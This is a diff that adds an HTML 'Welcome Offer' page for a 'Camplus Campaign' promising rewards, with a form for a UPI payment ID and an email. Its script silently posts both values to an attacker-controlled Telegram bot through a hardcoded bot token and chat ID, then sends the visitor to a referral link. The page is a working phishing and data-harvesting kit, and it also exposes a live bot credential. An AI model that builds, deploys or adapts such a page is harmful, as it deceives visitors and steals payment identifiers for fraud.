@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Welcome Offer</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body, html {
+      height: 100%;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)),
+                  url('https://images.unsplash.com/photo-1504384308090-c894fdcc538d?auto=format&fit=crop&w=1600&q=80') no-repeat center center/cover;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 40px;
+      border-radius: 15px;
+      text-align: center;
+      backdrop-filter: blur(10px);
+      max-width: 500px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
+    }
+
+    .container h1 {
+      font-size: 32px;
+      margin-bottom: 20px;
+    }
+
+    .container p {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: #eee;
+    }
+
+    .form-group {
+      text-align: left;
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      font-size: 15px;
+      margin-bottom: 5px;
+      color: #fff;
+    }
+
+    input[type="text"], input[type="email"] {
+      width: 100%;
+      padding: 12px 15px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    .cta-button, .submit-button {
+      background: #00c6ff;
+      background: linear-gradient(to right, #0072ff, #00c6ff);
+      border: none;
+      padding: 15px 30px;
+      font-size: 16px;
+      border-radius: 50px;
+      color: #fff;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      margin-top: 10px;
+    }
+
+    .cta-button:hover, .submit-button:hover {
+      background: linear-gradient(to right, #0052cc, #0099cc);
+    }
+
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      color: black;
+      padding: 25px 40px;
+      border-radius: 10px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+      display: none;
+      z-index: 10;
+      text-align: center;
+    }
+
+    .popup button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      background: #333;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .popup button:hover {
+      background: #555;
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.7);
+      display: none;
+      z-index: 5;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Camplus Campaign</h1>
+    <p>Start your journey to exclusive rewards, offers, and giveaways!</p>
+
+    <div class="form-group">
+      <label for="upi">UPI ID</label>
+      <input type="text" id="upi" placeholder="Enter your UPI ID" required>
+    </div>
+
+    <div class="form-group">
+      <label for="email">Email Address</label>
+      <input type="email" id="email" placeholder="Enter your Email" required>
+    </div>
+
+    <button class="submit-button" onclick="handleSubmit()">Submit</button>
+  </div>
+
+  <!-- Popup Message -->
+  <div class="overlay" id="overlay"></div>
+  <div class="popup" id="popup">
+    <h2>No Offers Available</h2>
+    <p>Currently, there are no offers available at the moment. Please check back later.</p>
+    <button onclick="closePopup()">OK</button>
+  </div>
+
+<script>
+  function handleSubmit() {
+    const upi = document.getElementById('upi').value.trim();
+    const email = document.getElementById('email').value.trim();
+
+    if (!upi || !email) {
+      alert("Please enter both UPI ID and Email.");
+      return;
+    }
+
+    const botToken = "7427071280:AAEk9zB9fVYOeWm0_ahwT53S5n8XPczePiQ";
+    const chatId = "7094705343";
+    const message = `
+<b>📥 New Submission Received</b>\n
+<b>🔰 Camp ID:</b> <code>Indiapolls ₹10</code>\n
+<b>🆔 UPI ID:</b> <code>${upi}</code>\n
+<b>📧 Email:</b> <code>${email}</code>
+    `;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "HTML"
+      })
+    }).finally(() => {
+      // Redirect instantly regardless of success or failure
+      window.location.href = "https://panel.indiapolls.com/#/referrals/view/1d0d5b85-9e76-4850-85c8-89e3575d0347";
+    });
+  }
+</script>
+
+</body>
+</html>
